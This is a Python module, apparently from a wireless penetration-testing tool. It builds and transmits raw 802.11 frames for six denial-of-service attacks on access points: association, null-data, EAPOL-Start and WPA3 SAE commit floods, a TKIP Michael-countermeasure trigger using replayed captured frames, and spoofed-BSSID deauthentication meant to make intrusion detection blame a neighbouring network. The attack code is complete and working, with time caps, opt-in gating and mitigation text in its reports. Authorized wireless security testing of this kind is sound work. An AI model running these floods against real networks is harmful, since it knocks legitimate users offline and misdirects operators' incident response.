# SPDX-License-Identifier: Apache-2.0 OR BSD-3-Clause
"""Frame floods built in-process: the denial-of-service tests with no tool behind them.

``flood.py`` drives ``mdk4``.  The floods here are the frames ``mdk4`` does not have,
so they are built with :mod:`wifipilot.rawtx` and transmitted through one
``AF_PACKET`` socket — which also means the frame shapes are in the report instead of
hidden behind a tool's flags:

* ``assoc_flood``     — association requests from fake stations: the *association*
  table is the resource that runs out, not the authentication table.
* ``null_data_flood`` — (QoS) Null frames with the power-management bit set: the AP
  buffers frames for stations it believes are asleep until its buffers run out.
* ``eapol_start_flood`` — EAPOL-Start from fake supplicants: the authenticator opens one
  802.1X session per frame and can finish none of them.
* ``sae_commit_flood`` — SAE commit frames: a WPA3 AP spends a scalar multiplication on
  every one, so a few hundred frames buy a lot of CPU (the Dragonblood "clogging" result).
* ``tkip_michael``    — replay a captured TKIP frame with its MIC corrupted, twice: a
  compliant AP then silences TKIP for a minute (the Michael countermeasure).
* ``wids_confusion``  — deauth frames carrying a *neighbour's* BSSID as the transmitter,
  so anything attributing management frames by address blames the wrong network.

Every one of these is a denial of service, and every one says so in its own report.
They are off by default, capped in time, and the planner only runs them when the
operator has explicitly asked for them.
"""

from __future__ import annotations

import contextlib
import time
from typing import List, Sequence

from ..models import STATUS_SUCCESS, AccessPoint, Attempt, Finding
from ..rawtx import (EAPOL_LOGOFF, RawInjector, build_assoc_request, build_deauth,
                     build_eapol_start, build_null_data, build_qos_eapol,
                     build_reassoc_request, injection_available, spoofed_mac)
from ..util import human_duration
from .base import Attack, AttackContext, AttackOutcome


class _FrameFlood(Attack):
    """Shared plumbing: build frames, spend a time budget sending them, report."""

    requires = ("monitor",)
    needs_injection = True
    category = "dos"
    noise = "loud"
    impact = "degraded"
    applies_to = ("WPA", "WPA2", "WPA2/WPA3", "WPA3", "WEP", "OPEN", "OWE",
                  "WPA-ENTERPRISE", "WPA2-ENTERPRISE", "ENTERPRISE")
    #: the attack never runs longer than this, whatever the config says
    max_seconds = 30.0
    #: frames per round (a round is one pass over the fake stations)
    frames_per_round = 1
    #: how many frames the simulation claims per second
    demo_rate = 400
    warning = ""
    finding_title = ""
    finding_severity = "medium"
    finding_detail = ""
    #: what the report says the honest deliverable is
    deliverable = "the finding, not a password"

    def applies(self, ap: AccessPoint) -> bool:
        return True

    def available(self, ctx: AttackContext) -> bool:
        if ctx.demo:
            return True
        return bool(ctx.monitor) and injection_available(ctx.monitor)

    def unavailable_reason(self, ctx: AttackContext) -> str:
        return ("this flood is built in-process, so it needs root/CAP_NET_RAW and a "
                f"monitor interface ({ctx.monitor or 'none'}); no external tool can "
                "send these frames for us")

    # ---------------------------------------------------------------- #
    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        """The frames for one round.  Subclasses build them; the base sends them."""
        raise NotImplementedError

    def preflight(self, ctx: AttackContext, ap: AccessPoint) -> str:
        """Return a reason to skip, or an empty string to run."""
        return ""

    # ---------------------------------------------------------------- #
    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(
            self.name, ap.bssid, tool=self.tool,
            chosen_by=getattr(ap, "picked_by", "heuristic"),
            reason=getattr(ap, "pick_reason", ""),
        )
        skip = self.preflight(ctx, ap)
        if skip:
            ctx.session.end_attempt(attempt, "skipped", skip)
            return AttackOutcome.skipped(skip, f"{ap.display_name}: {skip}")
        seconds = min(ctx.config.attack_timeout_for(self.name), self.max_seconds)
        ctx.bus.log(f"{self.label} against {ap.display_name} for "
                    f"{human_duration(seconds)}: {self.warning}", level="warning")
        if ctx.demo:
            return self._demo(ctx, ap, attempt, seconds)
        return self._live(ctx, ap, attempt, seconds)

    # ---------------------------------------------------------------- #
    def _finish(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                sent: int, failed: int, seconds: float, simulated: bool,
                note: str = "") -> AttackOutcome:
        detail = (f"{sent:,} frame(s) in {human_duration(seconds)}"
                  + (f", {failed:,} failed" if failed else "")
                  + (" (simulated)" if simulated else ""))
        body = f"{self.finding_detail} {detail}."
        if note:
            body += f"  {note}"
        ctx.session.add_finding(Finding(
            kind=self.name, severity=self.finding_severity, bssid=ap.bssid,
            title=self.finding_title, detail=body))
        ap.remember(self.name, detail, frames=sent)
        ctx.session.stats.floods_run += 1
        ctx.session.end_attempt(attempt, STATUS_SUCCESS, self.finding_title, detail)
        return AttackOutcome.success(
            self.finding_title, detail=f"{detail} — {self.deliverable}",
            extra={"frames": sent, "failed": failed, "seconds": round(seconds, 1),
                   "simulated": simulated, "category": self.category,
                   "noise": self.noise, "impact": self.impact,
                   "finding": self.finding_title,
                   "note": ("this is a denial-of-service test; the deliverable is "
                            "the finding, not a password")})

    # ---------------------------------------------------------------- #
    def _live(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
              seconds: float) -> AttackOutcome:
        if not self.available(ctx):
            return self._fail(ctx, attempt, "no injection path",
                              self.unavailable_reason(ctx))
        ctx.set_channel(ap.channel)
        started = time.time()
        sent = failed = rounds = 0
        error = ""
        injector = RawInjector(ctx.monitor)
        try:
            if not injector.open():
                return self._fail(ctx, attempt, "could not open the injection socket",
                                  injector.result.error)
            while not ctx.want_stop() and time.time() - started < seconds:
                rounds += 1
                result = injector.send(list(self.frames(ctx, ap, rounds)))
                sent += result.sent
                failed += result.failed
                if not result.sent and result.error:
                    error = result.error
                    break
                ctx.progress(f"{self.label} on {ap.display_name}", kind="capture",
                             bssid=ap.bssid,
                             percent=min(95, (time.time() - started) / seconds * 100),
                             detail=f"{sent:,} frame(s) sent")
        finally:
            with contextlib.suppress(Exception):
                injector.close()
        if not sent:
            return self._fail(ctx, attempt, "no frames were transmitted",
                              error or ("the interface accepted nothing in the time "
                                        "budget: check that it is really in monitor "
                                        "mode"))
        return self._finish(ctx, ap, attempt, sent, failed, time.time() - started, False,
                            note=f"{rounds} round(s), built by wifipilot itself")

    # ---------------------------------------------------------------- #
    def _demo(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
              seconds: float) -> AttackOutcome:
        sent = failed = 0
        started = time.time()
        step = 0
        window = min(seconds, 8.0)
        while time.time() - started < window and not ctx.want_stop():
            step += 1
            sent += self.demo_rate // 8 + step * 11
            ctx.progress(f"{self.label} on {ap.display_name}", kind="capture",
                         bssid=ap.bssid, percent=min(95, step * 20),
                         detail=f"{sent:,} frame(s) sent (simulated)")
            time.sleep(0.25)
        return self._finish(ctx, ap, attempt, sent, failed, time.time() - started, True)


class AssocFloodAttack(_FrameFlood):
    name = "assoc_flood"
    label = "Association flood (state exhaustion)"
    tool = "wifipilot rawtx.py (association requests)"
    description = ("Send association requests from thousands of fake stations.  Unlike "
                   "an authentication flood, every request makes the AP allocate and "
                   "hold state, so this measures the association table — the resource "
                   "that runs out first on consumer gear — and whether anything rate-"
                   "limits management frames at all.")
    frames_per_round = 24
    demo_rate = 900
    warning = ("an association flood fills the AP's association table: clients can be "
               "refused while it runs")
    finding_title = "Association table can be filled from the air"
    finding_severity = "high"
    finding_detail = ("association requests from stations that do not exist were "
                      "processed without rate limiting, which is how an association "
                      "table is exhausted.  The mitigation is a WIPS that rate-limits "
                      "management frames plus 802.11w — not a better password.")

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        base = round_index * self.frames_per_round
        frames: List[bytes] = []
        for index in range(self.frames_per_round):
            station = spoofed_mac(base + index)
            frames.append(build_assoc_request(ap.bssid, station, ssid=ap.essid or ""))
            if index % 8 == 7:                       # keep the table warm with reassocs
                frames.append(build_reassoc_request(
                    ap.bssid, spoofed_mac(base + index + 4096),
                    current_bssid=ap.bssid, ssid=ap.essid or ""))
        return frames


class NullDataFloodAttack(_FrameFlood):
    name = "null_data_flood"
    label = "Null-data flood (power-save buffer exhaustion)"
    tool = "wifipilot rawtx.py (QoS Null, PS bit)"
    description = ("Send Null frames with the power-management bit set from many fake "
                   "stations.  A Null frame carries no payload: its only job is to make "
                   "the AP believe a station is asleep, so the AP starts buffering "
                   "frames for stations that will never wake — and nothing on air looks "
                   "like an attack, because no deauthentication frame is ever sent.")
    frames_per_round = 32
    demo_rate = 1200
    warning = ("a null-data flood makes the AP buffer frames for stations that do not "
               "exist; traffic to real clients can be delayed while it runs")
    finding_title = "Power-save buffering is not bounded per station"
    finding_severity = "high"
    finding_detail = ("Null frames with the power-management bit set were accepted from "
                      "addresses that do not exist, so the AP's per-station buffers can "
                      "be claimed from the air.  Because these are data frames carrying "
                      "no payload, a WIDS that only counts deauth/disassoc frames sees "
                      "nothing at all.")

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        base = round_index * self.frames_per_round
        frames: List[bytes] = []
        for index in range(self.frames_per_round):
            station = spoofed_mac(77_000 + base + index)
            # alternate awake/asleep so the AP keeps flipping buffers instead of
            # settling into one state
            frames.append(build_null_data(ap.bssid, station, qos=True, tid=index % 8,
                                          power_save=index % 2 == 0))
            if index % 4 == 3:
                frames.append(build_null_data(ap.bssid, station, qos=False,
                                              power_save=True))
        return frames


class EapolStartFloodAttack(_FrameFlood):
    name = "eapol_start_flood"
    label = "EAPOL-Start flood (802.1X session exhaustion)"
    tool = "wifipilot rawtx.py (EAPOL-Start)"
    description = ("Send EAPOL-Start frames from thousands of fake supplicants: every "
                   "one makes the authenticator open a new 802.1X session, and the "
                   "authenticator has to hold each of them until the RADIUS exchange "
                   "times out.  The AP falls over before the RADIUS server does, which "
                   "is the classic result to show an enterprise that has never tested "
                   "it.")
    frames_per_round = 24
    demo_rate = 800
    warning = ("an EAPOL-Start flood opens 802.1X sessions the RADIUS server cannot "
               "finish; legitimate clients may fail to associate while it runs")
    finding_title = "802.1X sessions can be opened from the air without limit"
    finding_severity = "high"
    finding_detail = ("EAPOL-Start frames from addresses that do not exist were "
                      "accepted, so unauthenticated stations can make the "
                      "authenticator open and hold 802.1X state.  This is the "
                      "enterprise shape of the association flood, and the reason "
                      "802.1X deployments need a WIPS and per-client rate limits.")

    def applies(self, ap: AccessPoint) -> bool:
        # an EAPOL-Start only means something to an authenticator that does 802.1X,
        # which is what the planner means by "enterprise" (encryption *or* AKM)
        text = f"{ap.encryption} {ap.auth}".upper()
        return ("ENTERPRISE" in text or "802.1X" in text
                or (ap.auth or "").upper() in ("MGT", "ENTERPRISE"))

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        base = round_index * self.frames_per_round
        return [build_eapol_start(ap.bssid, spoofed_mac(91_000 + base + index))
                for index in range(self.frames_per_round)]


class SaeCommitFloodAttack(_FrameFlood):
    name = "sae_commit_flood"
    label = "SAE commit flood (WPA3 CPU exhaustion)"
    tool = "wifipilot rawtx.py (SAE commit frames)"
    description = ("Send SAE commit frames with random scalars.  Every commit costs the "
                   "AP a scalar multiplication on the negotiated group before any "
                   "authentication happens, so a few hundred frames buy a lot of CPU: "
                   "the Dragonblood \"clogging\" result.  The finding is whether the AP "
                   "offers a weak group (cheap for the attacker, expensive for the AP), "
                   "uses H2E (which removes the unconditional first cost), or falls "
                   "over.")
    frames_per_round = 8
    demo_rate = 60
    warning = ("a SAE commit flood spends the AP's CPU before authentication; clients "
               "may see failed WPA3 handshakes while it runs")
    finding_title = "SAE commit frames are processed before authentication (clogging)"
    finding_severity = "high"
    finding_detail = ("SAE commit frames from stations that do not exist reached the "
                      "AP's SAE state machine, so each one costs it a cryptographic "
                      "operation that an anti-clogging token is supposed to defer.  "
                      "Groups 22/23/24 are cheaper for the attacker and more expensive "
                      "for the AP than group 19, and H2E removes the unconditional "
                      "first cost entirely.")

    def applies(self, ap: AccessPoint) -> bool:
        return bool(ap.sae or "WPA3" in (ap.encryption or "").upper() or ap.sai)

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        from ..synth import build_sae_commit

        group = self._group(ap)
        frames: List[bytes] = []
        for index in range(self.frames_per_round):
            scalar = (round_index * 131 + index).to_bytes(2, "big") + b"\x11" * 30
            station = spoofed_mac(63_000 + round_index * 16 + index)
            frames.append(build_sae_commit(ap.bssid, station, group=group,
                                           scalar=scalar))
        return frames

    @staticmethod
    def _group(ap: AccessPoint) -> int:
        """The group to aim at: the weakest one the AP is known to advertise."""
        text = " ".join(str(getattr(ap, field, "") or "")
                        for field in ("notes", "wps_model", "encryption", "auth"))
        history = " ".join(str(entry) for entry in getattr(ap, "history", [])[-4:])
        text = f"{text} {history}"
        for group in (22, 23, 24, 21, 20, 19):       # weakest first
            if f"group {group}" in text or f'"group": {group}' in text:
                return group
        return 19


class TkipMichaelAttack(_FrameFlood):
    name = "tkip_michael"
    label = "TKIP Michael countermeasure (capture replay)"
    tool = "wifipilot rawtx.py (captured TKIP frames, MIC corrupted)"
    description = ("Replay a TKIP frame from a capture with its MIC corrupted.  A TKIP "
                   "AP counts MIC failures, and two failures inside 60 seconds make it "
                   "silence *all* TKIP traffic for a minute — the Michael "
                   "countermeasure, the reason TKIP is banned from 802.11n onward.  No "
                   "key is needed: the AP decrypts with its own and sees the MIC it "
                   "recomputes differ.\n\n"
                   "The finding is usually just that TKIP is in use at all.")
    frames_per_round = 1
    demo_rate = 2
    max_seconds = 8.0
    #: two corrupted frames buy a minute of outage for every TKIP client
    noise = "extreme"
    impact = "outage"
    warning = ("the Michael countermeasure silences TKIP traffic for 60 seconds once "
               "two MIC failures are counted; TKIP clients are disconnected by it")
    finding_title = "TKIP in use: the Michael countermeasure can be triggered from a capture"
    finding_severity = "high"
    finding_detail = ("the network still advertises TKIP, whose Michael countermeasure "
                      "turns two corrupted frames into a 60-second outage for every "
                      "TKIP client.  The frames can be taken from any capture of that "
                      "network — the attacker never needs a key.  The fix is to stop "
                      "offering TKIP, including CCMP/TKIP mixed mode.")

    def preflight(self, ctx: AttackContext, ap: AccessPoint) -> str:
        text = f"{ap.encryption} {ap.cipher} {ap.auth}".upper()
        if ctx.demo or "TKIP" in text or self._tkip_frames(ctx, ap):
            return ""
        return ("no TKIP advertised and no protected frame captured yet: run a capture "
                "attack first, because the Michael trigger needs a frame from this "
                "network")

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        captured = self._tkip_frames(ctx, ap)
        if captured:
            # the two failures have to land inside one 60-second window: one frame per
            # round, so the report shows both halves of the countermeasure
            return [captured[(round_index - 1) % len(captured)]]
        return [self._synthetic(ap, round_index)]

    # ---------------------------------------------------------------- #
    @staticmethod
    def _synthetic(ap: AccessPoint, round_index: int) -> bytes:
        """A best-effort stand-in when nothing was captured: corrupt the frame tail."""
        station = next(iter(ap.clients), "") or spoofed_mac(5_000 + round_index)
        frame = bytearray(build_qos_eapol(ap.bssid, station, EAPOL_LOGOFF))
        for offset in range(1, 9):                    # the trailing MIC/ICV bytes
            frame[-offset] ^= 0xA5
        return bytes(frame)

    def _tkip_frames(self, ctx: AttackContext, ap: AccessPoint) -> List[bytes]:
        """Protected data frames already captured from this AP, MIC corrupted."""
        frames: List[bytes] = []
        for capture in ctx.session.all_captures():
            if ap.bssid and capture.bssid and capture.bssid != ap.bssid:
                continue
            path = getattr(capture, "path", "")
            if not path:
                continue
            frames.extend(_corrupted_data_frames(path, limit=4))
            if frames:
                break
        return frames

    def _demo(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
              seconds: float) -> AttackOutcome:
        frames = self._tkip_frames(ctx, ap) or [self._synthetic(ap, 1)]
        sent = 0
        started = time.time()
        for index in range(2):                        # two failures are all it takes
            if ctx.want_stop():
                break
            sent += 1
            ctx.progress(f"{self.label} on {ap.display_name}", kind="capture",
                         bssid=ap.bssid, percent=30 + index * 30,
                         detail=(f"corrupted frame {index + 1}/2 of "
                                 f"{len(frames)} available (Michael trigger, simulated)"))
            time.sleep(0.3)
        return self._finish(
            ctx, ap, attempt, sent, 0, time.time() - started, True,
            note=("two MIC failures inside 60 seconds start the countermeasure, so the "
                  "outage lasts a minute from the second frame — and the frames "
                  "themselves came from a capture, not from a key"))


class WidsConfusionAttack(_FrameFlood):
    name = "wids_confusion"
    label = "WIDS attribution confusion (spoofed transmitter test)"
    tool = "wifipilot rawtx.py (deauth frames, foreign BSSID)"
    description = ("Send deauthentication frames whose transmitter address is a "
                   "*neighbouring* AP's BSSID.  Anything that attributes management "
                   "frames by address — a WIDS alert, a report, an incident ticket — "
                   "then blames the wrong network, and the operator's first response "
                   "goes to the wrong place.  The finding is whether the site's "
                   "monitoring can tell a spoofed transmitter from a genuine one.")
    frames_per_round = 16
    demo_rate = 700
    max_seconds = 25.0
    #: the attack exists to be noticed: the finding is about the site's monitoring
    noise = "extreme"
    warning = ("deauthentication frames are sent with another AP's address as the "
               "transmitter: clients of the target are disconnected and the site's "
               "monitoring may blame the neighbour")
    finding_title = "Management frames are unauthenticated (attribution can be forged)"
    finding_severity = "medium"
    finding_detail = ("deauthentication frames carrying a foreign BSSID were put on "
                      "air.  Pre-802.11w management frames have no authentication, so a "
                      "WIDS that attributes an attack by transmitter address will name "
                      "an innocent network; only frame-level correlation (RSSI, "
                      "sequence numbers, a second sensor) tells the difference.")

    def neighbours(self, ctx: AttackContext, ap: AccessPoint) -> List[str]:
        others = [candidate.bssid for candidate in ctx.session.sorted_aps()
                  if candidate.bssid != ap.bssid]
        return others[:3] or [spoofed_mac(31_337, locally_administered=False)]

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        neighbours = self.neighbours(ctx, ap)
        stations = list(ap.clients)[:4] or [spoofed_mac(80_000 + round_index)]
        frames: List[bytes] = []
        for index in range(self.frames_per_round):
            victim = stations[index % len(stations)]
            blame = neighbours[index % len(neighbours)]
            # addr2/addr3 carry the foreign BSSID: that is the whole attack
            frames.append(build_deauth(blame, client=victim, reason=7))
        return frames

    def _finish(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                sent: int, failed: int, seconds: float, simulated: bool,
                note: str = "") -> AttackOutcome:
        outcome = super()._finish(ctx, ap, attempt, sent, failed, seconds, simulated,
                                  note)
        blamed = self.neighbours(ctx, ap)
        outcome.extra["blamed_bssids"] = blamed
        # keep the base class's denial-of-service sentence: this is still a flood, and
        # the report has to say both what it does and what the finding is
        outcome.extra["note"] = (str(outcome.extra.get("note", "")) + "  The deauth "
                                 "frames name other networks as the transmitter, so "
                                 "the site's monitoring is the thing under test here.")
        return outcome


def _corrupted_data_frames(path: str, limit: int = 4) -> List[bytes]:
    """Read protected data frames out of a capture and corrupt the MIC.

    Only the last 8 bytes (a TKIP MIC) are touched, and only on frames that are
    actually protected: replaying an unprotected frame would be a different attack.
    The frames keep their radiotap header, so they can go straight to an injector.
    """
    from ..pcap import iter_frames

    frames: List[bytes] = []
    for _ts, buf, start, length in iter_frames(path):
        if length < 40:
            continue
        control = buf[start] | (buf[start + 1] << 8)
        if (control & 0x0C) != 0x08:                 # bits 3:2 — not a data frame
            continue
        if not control & 0x4000:                     # bit 14 — not protected
            continue
        frame = bytearray(bytes(buf[start:start + length]))
        for offset in range(1, 9):                   # the trailing MIC
            frame[-offset] ^= 0xA5
        frames.append(bytes(frame))
        if len(frames) >= limit:
            break
    return frames
